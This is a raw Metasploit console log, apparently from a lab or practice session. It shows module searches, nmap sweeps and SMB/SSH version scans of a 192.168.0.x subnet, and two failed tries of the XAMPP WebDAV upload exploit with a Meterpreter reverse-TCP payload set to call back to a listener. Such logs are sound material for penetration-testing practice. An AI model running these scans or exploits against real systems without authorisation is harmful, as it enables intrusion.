   50  exploit/unix/webapp/tikiwiki_upload_exec            2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
   51  auxiliary/admin/misc/wol                                             normal     No     UDP Wake-On-Lan (WOL)
   52  auxiliary/scanner/smb/impacket/wmiexec              2018-03-19       normal     No     WMI Exec
   53  post/windows/gather/enum_ad_managedby_groups                         normal     No     Windows Gather Active Directory Managed Groups
   54  post/windows/gather/enum_services                                    normal     No     Windows Gather Service Info Enumeration
   55  auxiliary/gather/windows_secrets_dump                                normal     No     Windows Secrets Dump
   56  exploit/windows/local/unquoted_service_path         2001-10-25       excellent  Yes    Windows Unquoted Service Path Privilege Escalation
   57  exploit/multi/http/wp_file_manager_rce              2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution
   58  exploit/windows/http/xampp_webdav_upload_php        2012-01-14       excellent  No     XAMPP WebDAV PHP Upload
   59  exploit/windows/http/zentao_pro_rce                 2020-06-20       excellent  Yes    ZenTao Pro 8.8.2 Remote Code Execution


Interact with a module by name or index. For example info 59, use 59 or use exploit/windows/http/zentao_pro_rce

msf6 auxiliary(scanner/smb/smb_version) > search xampp

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/multi/http/atutor_upload_traversal    2019-05-17       excellent  Yes    ATutor 2.2.4 - Directory Traversal / Remote Code Execution,
   1  exploit/multi/http/maracms_upload_exec        2020-08-31       excellent  Yes    MaraCMS Arbitrary PHP File Upload
   2  exploit/windows/http/xampp_webdav_upload_php  2012-01-14       excellent  No     XAMPP WebDAV PHP Upload
   3  exploit/windows/http/zentao_pro_rce           2020-06-20       excellent  Yes    ZenTao Pro 8.8.2 Remote Code Execution


Interact with a module by name or index. For example info 3, use 3 or use exploit/windows/http/zentao_pro_rce

msf6 auxiliary(scanner/smb/smb_version) > use exploit/windows/http/xampp_webdav_upload_php    
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(windows/http/xampp_webdav_upload_php) > set rhost 192.168.0.93
[-] Unknown datastore option: rhost. Did you mean LHOST?
msf6 exploit(windows/http/xampp_webdav_upload_php) > Interrupt: use the 'exit' command to quit
msf6 exploit(windows/http/xampp_webdav_upload_php) > options

Module options (exploit/windows/http/xampp_webdav_upload_php):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME                   no        The filename to give the payload. (Leave Blank for Random)
   PASSWORD  xampp            yes       The HTTP password to specify for authentication
   PATH      /webdav/         yes       The path to attempt to upload
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploi
                                        t
   RPORT     80               yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   USERNAME  wampp            yes       The HTTP username to specify for authentication
   VHOST                      no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.99     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/http/xampp_webdav_upload_php) > set rhosts 192.168.0.93
rhosts => 192.168.0.93
msf6 exploit(windows/http/xampp_webdav_upload_php) > show payloads

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/generic/custom                                       normal  No     Custom Payload
   1   payload/generic/shell_bind_tcp                               normal  No     Generic Command Shell, Bind TCP Inline
   2   payload/generic/shell_reverse_tcp                            normal  No     Generic Command Shell, Reverse TCP Inline
   3   payload/generic/ssh/interact                                 normal  No     Interact with Established SSH Connection
   4   payload/multi/meterpreter/reverse_http                       normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Multiple Architectures)
   5   payload/multi/meterpreter/reverse_https                      normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Multiple Architectures)
   6   payload/php/bind_perl                                        normal  No     PHP Command Shell, Bind TCP (via Perl)
   7   payload/php/bind_perl_ipv6                                   normal  No     PHP Command Shell, Bind TCP (via perl) IPv6
   8   payload/php/bind_php                                         normal  No     PHP Command Shell, Bind TCP (via PHP)
   9   payload/php/bind_php_ipv6                                    normal  No     PHP Command Shell, Bind TCP (via php) IPv6
   10  payload/php/download_exec                                    normal  No     PHP Executable Download and Execute
   11  payload/php/exec                                             normal  No     PHP Execute Command
   12  payload/php/meterpreter/bind_tcp                             normal  No     PHP Meterpreter, Bind TCP Stager
   13  payload/php/meterpreter/bind_tcp_ipv6                        normal  No     PHP Meterpreter, Bind TCP Stager IPv6
   14  payload/php/meterpreter/bind_tcp_ipv6_uuid                   normal  No     PHP Meterpreter, Bind TCP Stager IPv6 with UUID Support
   15  payload/php/meterpreter/bind_tcp_uuid                        normal  No     PHP Meterpreter, Bind TCP Stager with UUID Support
   16  payload/php/meterpreter/reverse_tcp                          normal  No     PHP Meterpreter, PHP Reverse TCP Stager
   17  payload/php/meterpreter/reverse_tcp_uuid                     normal  No     PHP Meterpreter, PHP Reverse TCP Stager
   18  payload/php/meterpreter_reverse_tcp                          normal  No     PHP Meterpreter, Reverse TCP Inline
   19  payload/php/reverse_perl                                     normal  No     PHP Command, Double Reverse TCP Connection (via Perl)
   20  payload/php/reverse_php                                      normal  No     PHP Command Shell, Reverse TCP (via PHP)

msf6 exploit(windows/http/xampp_webdav_upload_php) > set payload php/meterpreter/reverse_tcp 
payload => php/meterpreter/reverse_tcp
msf6 exploit(windows/http/xampp_webdav_upload_php) > options

Module options (exploit/windows/http/xampp_webdav_upload_php):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME                   no        The filename to give the payload. (Leave Blank for Random)
   PASSWORD  xampp            yes       The HTTP password to specify for authentication
   PATH      /webdav/         yes       The path to attempt to upload
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    192.168.0.93     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploi
                                        t
   RPORT     80               yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   USERNAME  wampp            yes       The HTTP username to specify for authentication
   VHOST                      no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.99     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/http/xampp_webdav_upload_php) > exploit

[*] Started reverse TCP handler on 192.168.0.99:4444 
[*] Uploading Payload to /webdav/P3t74ok.php
[-] Failed to upload file!
[*] Exploit completed, but no session was created.
msf6 exploit(windows/http/xampp_webdav_upload_php) > show payloads 

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/generic/custom                                       normal  No     Custom Payload
   1   payload/generic/shell_bind_tcp                               normal  No     Generic Command Shell, Bind TCP Inline
   2   payload/generic/shell_reverse_tcp                            normal  No     Generic Command Shell, Reverse TCP Inline
   3   payload/generic/ssh/interact                                 normal  No     Interact with Established SSH Connection
   4   payload/multi/meterpreter/reverse_http                       normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Multiple Architectures)
   5   payload/multi/meterpreter/reverse_https                      normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Multiple Architectures)
   6   payload/php/bind_perl                                        normal  No     PHP Command Shell, Bind TCP (via Perl)
   7   payload/php/bind_perl_ipv6                                   normal  No     PHP Command Shell, Bind TCP (via perl) IPv6
   8   payload/php/bind_php                                         normal  No     PHP Command Shell, Bind TCP (via PHP)
   9   payload/php/bind_php_ipv6                                    normal  No     PHP Command Shell, Bind TCP (via php) IPv6
   10  payload/php/download_exec                                    normal  No     PHP Executable Download and Execute
   11  payload/php/exec                                             normal  No     PHP Execute Command
   12  payload/php/meterpreter/bind_tcp                             normal  No     PHP Meterpreter, Bind TCP Stager
   13  payload/php/meterpreter/bind_tcp_ipv6                        normal  No     PHP Meterpreter, Bind TCP Stager IPv6
   14  payload/php/meterpreter/bind_tcp_ipv6_uuid                   normal  No     PHP Meterpreter, Bind TCP Stager IPv6 with UUID Support
   15  payload/php/meterpreter/bind_tcp_uuid                        normal  No     PHP Meterpreter, Bind TCP Stager with UUID Support
   16  payload/php/meterpreter/reverse_tcp                          normal  No     PHP Meterpreter, PHP Reverse TCP Stager
   17  payload/php/meterpreter/reverse_tcp_uuid                     normal  No     PHP Meterpreter, PHP Reverse TCP Stager
   18  payload/php/meterpreter_reverse_tcp                          normal  No     PHP Meterpreter, Reverse TCP Inline
   19  payload/php/reverse_perl                                     normal  No     PHP Command, Double Reverse TCP Connection (via Perl)
   20  payload/php/reverse_php                                      normal  No     PHP Command Shell, Reverse TCP (via PHP)

msf6 exploit(windows/http/xampp_webdav_upload_php) > search microsoft-ds
[-] No results from search
msf6 exploit(windows/http/xampp_webdav_upload_php) > 
msf6 exploit(windows/http/xampp_webdav_upload_php) > set payload 
payload => php/meterpreter/reverse_tcp
msf6 exploit(windows/http/xampp_webdav_upload_php) > options

Module options (exploit/windows/http/xampp_webdav_upload_php):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME                   no        The filename to give the payload. (Leave Blank for Random)
   PASSWORD  xampp            yes       The HTTP password to specify for authentication
   PATH      /webdav/         yes       The path to attempt to upload
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    192.168.0.93     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploi
                                        t
   RPORT     80               yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   USERNAME  wampp            yes       The HTTP username to specify for authentication
   VHOST                      no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.99     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/http/xampp_webdav_upload_php) > exploit

[*] Started reverse TCP handler on 192.168.0.99:4444 
[*] Uploading Payload to /webdav/wd16XyP.php
[-] Failed to upload file!
[*] Exploit completed, but no session was created.
msf6 exploit(windows/http/xampp_webdav_upload_php) > show payloads



$$$$$$$$$$$$$$$$$$$$$$$$$
LOGS
cat /usr/share/metasploit-framework/config/database.yml            

development:
  adapter: postgresql
  database: msf
  username: msf
  password: some-postgresql-token
  host: localhost
  port: 5432
  pool: 5
  timeout: 5

production:
  adapter: postgresql
  database: msf
  username: msf
  password: some-postgresql-token
  host: localhost
  port: 5432
  pool: 5
  timeout: 5

test:
  adapter: postgresql
  database: msf_test
  username: msf
  password: some-postgresql-token
  host: localhost
  port: 5432
  pool: 5
  timeout: 5
    
msf6 > history
1   search cve:2009 type:exploit
2   history
3   workspace -a msftests
4   db_status
5   db_connect
6   /usr/share/metasploit-framework/config/database.yml
7   db_connect -y /usr/share/metasploit-framework/config/database.yml
8   db_status
9   db_connect -y /usr/share/metasploit-framework/config/database.yml
10  db_status
11  db_connect -y /usr/share/metasploit-framework/config/database.yml
12  /]
13  db_connect -y /usr/share/metasploit-framework/config/database.yml
14  db_connect msf_user:123456:@127.0.0.1:5432/msf_database
15  db_status
16  db_connect msf_user:123456:@127.0.0.1:5432/msf_database
17  db_connect -y /usr/share/metasploit-framework/config/database.yml
18  workspace -a msftests
19  db_nmap -F 192.168.0.1-10
20  db_nmap -F 192.168.0.1-255
21  hosts
22  services
23  history

msf6 > workspace -a claro
[*] Added workspace: claro
[*] Workspace: claro

msf6 > db_nmap -F 192.168.0.1-255
[*] Nmap: Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-07 16:54 -03
[*] Nmap: Nmap scan report for 192.168.0.1
[*] Nmap: Host is up (0.030s latency).
[*] Nmap: Not shown: 96 closed tcp ports (reset)
[*] Nmap: PORT     STATE    SERVICE
[*] Nmap: 80/tcp   open     http
[*] Nmap: 139/tcp  filtered netbios-ssn
[*] Nmap: 443/tcp  open     https
[*] Nmap: 5000/tcp open     upnp
[*] Nmap: MAC Address: C8:5D:38:5C:3A:2A (Humax)
[*] Nmap: Nmap scan report for 192.168.0.40
[*] Nmap: Host is up (0.015s latency).
[*] Nmap: Not shown: 99 filtered tcp ports (no-response)
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 7070/tcp open  realserver
[*] Nmap: MAC Address: 00:E0:4C:F0:C4:BF (Realtek Semiconductor)
[*] Nmap: Nmap scan report for 192.168.0.62
[*] Nmap: Host is up (0.068s latency).
[*] Nmap: Not shown: 99 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 7070/tcp open  realserver
[*] Nmap: MAC Address: 48:D8:90:3B:FC:84 (Fn-link Technology Limited)
[*] Nmap: Nmap scan report for 192.168.0.85
[*] Nmap: Host is up (0.052s latency).
[*] Nmap: Not shown: 99 filtered tcp ports (no-response)
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 7070/tcp open  realserver
[*] Nmap: MAC Address: 4C:EB:BD:6B:51:0F (Chongqing Fugui Electronics)
[*] Nmap: Nmap scan report for 192.168.0.93
[*] Nmap: Host is up (0.063s latency).
[*] Nmap: Not shown: 99 filtered tcp ports (no-response)
[*] Nmap: PORT    STATE SERVICE
[*] Nmap: 139/tcp open  netbios-ssn
[*] Nmap: MAC Address: 9C:30:5B:FC:1F:53 (Hon Hai Precision Ind.)
[*] Nmap: Nmap scan report for 192.168.0.188
[*] Nmap: Host is up (0.11s latency).
[*] Nmap: Not shown: 99 filtered tcp ports (no-response)
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 7070/tcp open  realserver
[*] Nmap: MAC Address: 2C:D2:6B:0B:9D:B7 (Fn-link Technology Limited)
[*] Nmap: Nmap scan report for 192.168.0.99
[*] Nmap: Host is up (0.0000050s latency).
[*] Nmap: Not shown: 98 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 22/tcp   open  ssh
[*] Nmap: 7070/tcp open  realserver
[*] Nmap: Nmap done: 255 IP addresses (7 hosts up) scanned in 69.93 seconds
msf6 > hosts
Hosts
=====
address        mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------        ---                ----  -------  ---------  -----  -------  ----  --------
192.168.0.1    c8:5d:38:5c:3a:2a        Unknown                    device
192.168.0.40   00:e0:4c:f0:c4:bf        Unknown                    device
192.168.0.62   48:d8:90:3b:fc:84        Unknown                    device
192.168.0.85   4c:eb:bd:6b:51:0f        Unknown                    device
192.168.0.93   9c:30:5b:fc:1f:53        Unknown                    device
192.168.0.99                            Unknown                    device
192.168.0.188  2c:d2:6b:0b:9d:b7        Unknown                    device
msf6 > services
Services
========
host           port  proto  name         state     info
----           ----  -----  ----         -----     ----
192.168.0.1    80    tcp    http         open
192.168.0.1    139   tcp    netbios-ssn  filtered
192.168.0.1    443   tcp    https        open
192.168.0.1    5000  tcp    upnp         open
192.168.0.40   7070  tcp    realserver   open
192.168.0.62   7070  tcp    realserver   open
192.168.0.85   7070  tcp    realserver   open
192.168.0.93   139   tcp    netbios-ssn  open
192.168.0.99   22    tcp    ssh          open
192.168.0.99   7070  tcp    realserver   open
192.168.0.188  7070  tcp    realserver   open
msf6 > service
[*] exec: service
Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]
msf6 > service --status-all
[*] exec: service --status-all
 [ - ]  apache-htcacheclean
 [ - ]  apache2
 [ - ]  apparmor
 [ - ]  atftpd
 [ - ]  avahi-daemon
 [ - ]  bluetooth
 [ - ]  chrome-remote-desktop
 [ - ]  console-setup.sh
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ - ]  dns2tcp
 [ + ]  haveged
 [ - ]  hwclock.sh
 [ - ]  inetsim
 [ - ]  iodined
 [ - ]  ipsec
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ + ]  lightdm
 [ - ]  lvm2
 [ - ]  lvm2-lvmpolld
 [ - ]  mariadb
 [ - ]  miredo
 [ + ]  networking
 [ - ]  nfs-common
 [ - ]  nginx
 [ - ]  nmbd
 [ - ]  openvpn
 [ - ]  plymouth
 [ + ]  plymouth-log
 [ + ]  postgresql
 [ + ]  procps
 [ - ]  ptunnel
 [ - ]  pulseaudio-enable-autospawn
 [ - ]  redis-server
 [ - ]  redsocks
 [ - ]  rpcbind
 [ - ]  rsync
 [ - ]  rwhod
 [ - ]  samba-ad-dc
 [ - ]  saned
 [ - ]  screen-cleanup
 [ + ]  smartmontools
 [ - ]  smbd
 [ - ]  snmpd
 [ - ]  speech-dispatcher
 [ + ]  ssh
 [ - ]  sslh
 [ - ]  stunnel4
 [ - ]  sudo
 [ - ]  sysstat
 [ + ]  udev
 [ - ]  x11-common
 [ - ]  xl2tpd
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(scanner/ssh/ssh_version) > services -u -p 22 -R
Services
========
host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
192.168.0.99  22    tcp    ssh   open
RHOSTS => 192.168.0.99
msf6 auxiliary(scanner/ssh/ssh_version) > setg threads 10
threads => 10
msf6 auxiliary(scanner/ssh/ssh_version) > service
[*] exec: service
Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]
msf6 auxiliary(scanner/ssh/ssh_version) > services
Services
========
host           port  proto  name         state     info
----           ----  -----  ----         -----     ----
192.168.0.1    80    tcp    http         open
192.168.0.1    139   tcp    netbios-ssn  filtered
192.168.0.1    443   tcp    https        open
192.168.0.1    5000  tcp    upnp         open
192.168.0.40   7070  tcp    realserver   open
192.168.0.62   7070  tcp    realserver   open
192.168.0.85   7070  tcp    realserver   open
192.168.0.93   139   tcp    netbios-ssn  open
192.168.0.99   22    tcp    ssh          open
192.168.0.99   7070  tcp    realserver   open
192.168.0.188  7070  tcp    realserver   open
msf6 auxiliary(scanner/ssh/ssh_version) > services -u -p 22 7070  -R
[-] Invalid host parameter, 7070.
msf6 auxiliary(scanner/ssh/ssh_version) > options
Module options (auxiliary/scanner/ssh/ssh_version):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   192.168.0.99     yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                       /wiki/Using-Metasploit
   RPORT    22               yes       The target port (TCP)
   THREADS  10               yes       The number of concurrent threads (max one per host)
   TIMEOUT  30               yes       Timeout for the SSH probe
msf6 auxiliary(scanner/ssh/ssh_version) > services -u -p 22  -R
Services
========
host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
192.168.0.99  22    tcp    ssh   open
RHOSTS => 192.168.0.99
msf6 auxiliary(scanner/ssh/ssh_version) > db_nmap -F 192.168.0.1-255
[*] Nmap: Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-07 17:19 -03
[*] Nmap: Nmap scan report for 192.168.0.1
[*] Nmap: Host is up (0.011s latency).
[*] Nmap: Not shown: 96 closed tcp ports (reset)
[*] Nmap: PORT     STATE    SERVICE
[*] Nmap: 80/tcp   open     http
[*] Nmap: 139/tcp  filtered netbios-ssn
[*] Nmap: 443/tcp  open     https
[*] Nmap: 5000/tcp open     upnp
[*] Nmap: MAC Address: C8:5D:38:5C:3A:2A (Humax)
[*] Nmap: Nmap scan report for 192.168.0.40
[*] Nmap: Host is up (0.0092s latency).
[*] Nmap: Not shown: 99 filtered tcp ports (no-response)
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 7070/tcp open  realserver
[*] Nmap: MAC Address: 00:E0:4C:F0:C4:BF (Realtek Semiconductor)
[*] Nmap: Nmap scan report for 192.168.0.62
[*] Nmap: Host is up (0.0081s latency).
[*] Nmap: Not shown: 99 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 7070/tcp open  realserver
[*] Nmap: MAC Address: 48:D8:90:3B:FC:84 (Fn-link Technology Limited)
[*] Nmap: Nmap scan report for 192.168.0.85
[*] Nmap: Host is up (0.061s latency).
[*] Nmap: Not shown: 99 filtered tcp ports (no-response)
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 7070/tcp open  realserver
[*] Nmap: MAC Address: 4C:EB:BD:6B:51:0F (Chongqing Fugui Electronics)
[*] Nmap: Nmap scan report for 192.168.0.93
[*] Nmap: Host is up (0.054s latency).
[*] Nmap: Not shown: 99 filtered tcp ports (no-response)
[*] Nmap: PORT    STATE SERVICE
[*] Nmap: 445/tcp open  microsoft-ds
[*] Nmap: MAC Address: 9C:30:5B:FC:1F:53 (Hon Hai Precision Ind.)
[*] Nmap: Nmap scan report for 192.168.0.173
[*] Nmap: Host is up (0.095s latency).
[*] Nmap: Not shown: 99 filtered tcp ports (no-response)
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 7070/tcp open  realserver
[*] Nmap: MAC Address: 00:D7:6D:57:59:5E (Intel Corporate)
[*] Nmap: Nmap scan report for 192.168.0.188
[*] Nmap: Host is up (0.088s latency).
[*] Nmap: Not shown: 99 filtered tcp ports (no-response)
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 7070/tcp open  realserver
[*] Nmap: MAC Address: 2C:D2:6B:0B:9D:B7 (Fn-link Technology Limited)
[*] Nmap: Nmap scan report for 192.168.0.99
[*] Nmap: Host is up (0.0000080s latency).
[*] Nmap: Not shown: 98 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 22/tcp   open  ssh
[*] Nmap: 7070/tcp open  realserver
[*] Nmap: Nmap done: 255 IP addresses (8 hosts up) scanned in 63.67 seconds
msf6 auxiliary(scanner/ssh/ssh_version) > hosts
Hosts
=====
address        mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------        ---                ----  -------  ---------  -----  -------  ----  --------
192.168.0.1    C8:5D:38:5C:3A:2A        Unknown                    device
192.168.0.40   00:E0:4C:F0:C4:BF        Unknown                    device
192.168.0.62   48:D8:90:3B:FC:84        Unknown                    device
192.168.0.85   4C:EB:BD:6B:51:0F        Unknown                    device
192.168.0.93   9c:30:5b:fc:1f:53        Unknown                    device
192.168.0.99                            Unknown                    device
192.168.0.173  00:d7:6d:57:59:5e        Unknown                    device
192.168.0.188  2C:D2:6B:0B:9D:B7        Unknown                    device
msf6 auxiliary(scanner/ssh/ssh_version) > services
Services
========
host           port  proto  name          state     info
----           ----  -----  ----          -----     ----
192.168.0.1    80    tcp    http          open
192.168.0.1    139   tcp    netbios-ssn   filtered
192.168.0.1    443   tcp    https         open
192.168.0.1    5000  tcp    upnp          open
192.168.0.40   7070  tcp    realserver    open
192.168.0.62   7070  tcp    realserver    open
192.168.0.85   7070  tcp    realserver    open
192.168.0.93   139   tcp    netbios-ssn   open
192.168.0.93   445   tcp    microsoft-ds  open
192.168.0.99   22    tcp    ssh           open
192.168.0.99   7070  tcp    realserver    open
192.168.0.173  7070  tcp    realserver    open
192.168.0.188  7070  tcp    realserver    open
msf6 auxiliary(scanner/ssh/ssh_version) > services -u -p 22 -R
Services
========
host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
192.168.0.99  22    tcp    ssh   open
RHOSTS => 192.168.0.99
msf6 auxiliary(scanner/ssh/ssh_version) > setg threads 10
threads => 10
msf6 auxiliary(scanner/ssh/ssh_version) > run
[+] 192.168.0.99:22       - SSH server version: SSH-2.0-OpenSSH_9.0p1 Debian-1+b1
[*] 192.168.0.99:22       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_version) > save
Saved configuration to: /root/.msf4/config
msf6 auxiliary(scanner/ssh/ssh_version) > use auxiliary/scanner/http/http_version 
msf6 auxiliary(scanner/http/http_version) > options
Module options (auxiliary/scanner/http/http_version):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                       /wiki/Using-Metasploit
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   THREADS  10               yes       The number of concurrent threads (max one per host)
   VHOST                     no        HTTP server virtual host
msf6 auxiliary(scanner/http/http_version) > services -u -p 80 -R  
Services                                                                                                                             
========                                                                                                                             
host         port  proto  name  state  info
----         ----  -----  ----  -----  ----
192.168.0.1  80    tcp    http  open
RHOSTS => 192.168.0.1
msf6 auxiliary(scanner/http/http_version) > use auxiliary/scanner/smb/smb_version   
msf6 auxiliary(scanner/smb/smb_version) > services -u -p 445 -R   
Services
========
host          port  proto  name          state  info
----          ----  -----  ----          -----  ----
192.168.0.93  445   tcp    microsoft-ds  open
RHOSTS => 192.168.0.93
msf6 auxiliary(scanner/smb/smb_version) > run
[*] 192.168.0.93:445      - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:LZNT1) (encryption capabilities:AES-128-GCM) (signatures:optional) (guid:{871b726c-666a-4d5d-be7c-880ef430ace9}) (authentication domain:QINTESS)
[*] 192.168.0.93:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_version) > hosts
Hosts
=====
address        mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------        ---                ----  -------  ---------  -----  -------  ----  --------
192.168.0.1    C8:5D:38:5C:3A:2A        Unknown                    device
192.168.0.40   00:E0:4C:F0:C4:BF        Unknown                    device
192.168.0.62   48:D8:90:3B:FC:84        Unknown                    device
192.168.0.85   4C:EB:BD:6B:51:0F        Unknown                    device
192.168.0.93   9c:30:5b:fc:1f:53        Unknown                    device
192.168.0.99                            Unknown                    device
192.168.0.173  00:d7:6d:57:59:5e        Unknown                    device
192.168.0.188  2C:D2:6B:0B:9D:B7        Unknown                    device
msf6 auxiliary(scanner/smb/smb_version) > services -u
Services
========
host           port  proto  name          state  info
----           ----  -----  ----          -----  ----
192.168.0.1    80    tcp    http          open
192.168.0.1    443   tcp    https         open
192.168.0.1    5000  tcp    upnp          open
192.168.0.40   7070  tcp    realserver    open
192.168.0.62   7070  tcp    realserver    open
192.168.0.85   7070  tcp    realserver    open
192.168.0.93   139   tcp    netbios-ssn   open
192.168.0.93   445   tcp    microsoft-ds  open
192.168.0.99   22    tcp    ssh           open   SSH-2.0-OpenSSH_9.0p1 Debian-1+b1
192.168.0.99   7070  tcp    realserver    open
192.168.0.173  7070  tcp    realserver    open
192.168.0.188  7070  tcp    realserver    open
msf6 auxiliary(scanner/smb/smb_version) > services 192.168.0.93
Services
========
host          port  proto  name          state  info
----          ----  -----  ----          -----  ----
192.168.0.93  139   tcp    netbios-ssn   open
192.168.0.93  445   tcp    microsoft-ds  open
msf6 auxiliary(scanner/smb/smb_version) > search xamp
Matching Modules
================
   #   Name                                                Disclosure Date  Rank       Check  Description
   -   ----                                                ---------------  ----       -----  -----------
   0   exploit/multi/http/atutor_upload_traversal          2019-05-17       excellent  Yes    ATutor 2.2.4 - Directory Traversal / Remote Code Execution,
   1   exploit/android/browser/stagefright_mp4_tx3g_64bit  2015-08-13       normal     No     Android Stagefright MP4 tx3g Integer Overflow
   2   exploit/multi/http/struts2_code_exec_showcase       2017-07-07       excellent  Yes    Apache Struts 2 Struts 1 Plugin Showcase OGNL Code Execution
   3   auxiliary/admin/http/tomcat_ghostcat                2020-02-20       normal     Yes    Apache Tomcat AJP File Read
   4   exploit/multi/http/tomcat_mgr_deploy                2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   5   exploit/multi/http/tomcat_mgr_upload                2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   6   exploit/windows/misc/itunes_extm3u_bof              2012-06-21       normal     No     Apple iTunes 10 Extended M3U Stack Buffer Overflow
   7   auxiliary/server/capture/http_javascript_keylogger                   normal     No     Capture: HTTP JavaScript Keylogger
   8   auxiliary/scanner/smb/impacket/dcomexec             2018-03-19       normal     No     DCOM Exec
   9   auxiliary/scanner/smb/impacket/secretsdump                           normal     No     DCOM Exec
   10  post/windows/manage/dell_memory_protect                              manual     No     Dell DBUtilDrv2.sys Memory Protection Modifier
   11  auxiliary/gather/get_user_spns                      2014-09-27       normal     No     Gather Ticket Granting Service (TGS) tickets for User Service Principal Names (SPN)
   12  exploit/multi/http/getsimplecms_unauth_code_exec    2019-04-28       excellent  Yes    GetSimpleCMS Unauthenticated RCE
   13  exploit/windows/misc/hp_dataprotector_new_folder    2012-03-12       normal     No     HP Data Protector Create New Folder Buffer Overflow
   14  auxiliary/server/browser_autopwn2                   2015-07-05       normal     No     HTTP Client Automatic Exploiter 2 (Browser Autopwn)
   15  auxiliary/server/http_ntlmrelay                                      normal     No     HTTP Client MS Credential Relayer
   16  auxiliary/scanner/http/prev_dir_same_name_file                       normal     No     HTTP Previous Directory File Scanner
   17  auxiliary/server/icmp_exfil                                          normal     No     ICMP Exfiltration Service
   18  exploit/unix/fileformat/imagemagick_delegate        2016-05-03       excellent  No     ImageMagick Delegate Arbitrary Command Execution
   19  exploit/multi/browser/java_rhino                    2011-10-18       excellent  No     Java Applet Rhino Script Engine Remote Code Execution
   20  exploit/linux/local/ptrace_traceme_pkexec_helper    2019-07-04       excellent  Yes    Linux Polkit pkexec helper PTRACE_TRACEME local root exploit
   21  exploit/multi/http/lcms_php_exec                    2011-03-03       excellent  Yes    LotusCMS 3.0 eval() Remote Command Execution
   22  auxiliary/scanner/mssql/mssql_schemadump                             normal     No     MSSQL Schema Dump
